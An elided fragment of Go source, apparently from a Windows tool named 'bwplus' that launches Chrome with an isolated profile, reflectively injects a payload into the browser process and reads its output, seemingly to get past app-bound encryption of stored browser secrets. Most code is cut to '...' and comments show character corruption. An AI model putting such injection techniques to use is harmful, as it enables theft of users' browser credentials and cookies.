...
import (
	...
	"bwplus/crypto/windows/abe_native/bootstrap"
	"bwplus/utils/winapi"
)
...
func (r *Reflective) Inject(exePath string, payload []byte, env map[string]string) ([]byte, error) {
	...
	// scheduler infrastructure 鈥?the child will show a normal browser window under the isolated
	...
	// Read output before TerminateProcess 鈥?after kill the memory is gone.
...
// Only --user-data-dir=<temp> is passed 鈥?this is the one switch that matters: it escapes the running
...
// "nothing to do" after bypassing window creation 鈥?letting the browser show a normal window under
...
func buildIsolatedCommandLine(exePath, udd string) string {
	// %q would Go-escape backslashes (C:\foo 鈫?C:\\foo); Windows CommandLineToArgvW then keeps them
...
func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait time.Duration) error {
	...
	if err != nil {
		// Diagnostic: distinguish a dead target (Chrome self-exited before we could inject 鈥?policy,
